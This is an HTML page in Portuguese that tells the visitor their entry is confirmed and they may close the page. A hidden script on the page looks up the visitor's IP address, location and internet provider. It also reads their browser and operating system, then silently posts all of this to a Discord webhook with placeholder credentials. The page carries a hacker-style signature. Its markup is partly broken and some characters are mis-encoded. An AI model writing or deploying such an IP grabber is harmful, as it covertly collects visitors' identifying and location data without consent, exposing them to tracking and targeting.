<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />

    <style>
      body {
        background-color: #0d0d0d;
        color: #00ffcc;
        font-family: Arial, sans-serif;

  <body>
    <h2>Entrada confirmada.</h2>
    <p>Voc√™ j√° pode fechar esta p√°gina.</p>

    <script>
      fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .then(data => {
          const ip = data.ip;
          const cidade = data.city;
          const regiao = data.region;
          const pais = data.country_name;
          const org = data.org;

          const userAgent = navigator.userAgent;
          let navegador = "Desconhecido";
          let sistema = "Desconhecido";

          if (userAgent.includes("Firefox")) navegador = "Firefox";
          else if (userAgent.includes("Edg")) navegador = "Microsoft Edge";
          else if (userAgent.includes("Chrome")) navegador = "Google Chrome";
          else if (userAgent.includes("Safari")) navegador = "Safari";

          if (userAgent.includes("Windows")) sistema = "Windows";
          else if (userAgent.includes("Mac")) sistema = "macOS";
          else if (userAgent.includes("Android")) sistema = "Android";
          else if (userAgent.includes("Linux")) sistema = "Linux";
          else if (userAgent.includes("iPhone")) sistema = "iOS";

          const agora = new Date();
          const dataHora = agora.toLocaleString("pt-BR", {
            timeZone: "America/Sao_Paulo"
          });

          fetch("https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              content: `üîî Acesso detectado!
IP: ${ip}
Local: ${cidade}, ${regiao}, ${pais}
Operadora: ${org}
Navegador: ${navegador}
Sistema: ${sistema}
Hora: ${dataHora}
Assinatura: +‚ÇøLACKV√òID`
            })
          });
        })
        .catch(err => console.error("Erro:", err));
    </script>
  </body>
